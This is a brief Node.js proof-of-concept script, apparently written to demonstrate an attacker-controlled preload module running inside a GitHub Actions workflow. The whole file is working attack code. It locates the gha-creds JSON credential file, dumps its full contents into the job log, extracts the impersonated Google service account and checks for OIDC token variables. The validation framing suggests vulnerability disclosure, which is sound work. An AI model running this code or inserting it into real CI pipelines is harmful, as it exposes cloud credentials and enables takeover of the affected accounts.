import { readdirSync, readFileSync } from "fs";
import { createHash } from "crypto";

const ws = process.env.GITHUB_WORKSPACE || process.cwd();

console.error("[VALIDATION] attacker-controlled preload executed");

const creds = readdirSync(ws).find(f => /^gha-creds-.*\.json$/.test(f));

if (!creds) {
  console.error("[VALIDATION] no gha-creds file found");
  process.exit(0);
}

const path = `${ws}/${creds}`;
const body = readFileSync(path, "utf8");
console.log("File contents:\n", body);

console.error("[VALIDATION] creds file found:", path);
console.error("[VALIDATION] creds file readable: true");
console.error("[VALIDATION] creds file size:", body.length);
console.error("[VALIDATION] creds file sha256:",
  createHash("sha256").update(body).digest("hex"));

const sa = body.match(/serviceAccounts\/([^":]+):generateAccessToken/);

console.error("[VALIDATION] impersonated service account:",
  sa?.[1] || "not found");

console.error("[VALIDATION] contains external_account:",
  body.includes("external_account"));

console.error("[VALIDATION] contains sts.googleapis.com:",
  body.includes("sts.googleapis.com"));

console.error("[VALIDATION] GOOGLE_APPLICATION_CREDENTIALS:",
  process.env.GOOGLE_APPLICATION_CREDENTIALS);

console.error("[VALIDATION] ACTIONS_ID_TOKEN_REQUEST_URL present:",
  !!process.env.ACTIONS_ID_TOKEN_REQUEST_URL);

console.error("[VALIDATION] ACTIONS_ID_TOKEN_REQUEST_TOKEN present:",
  !!process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN);
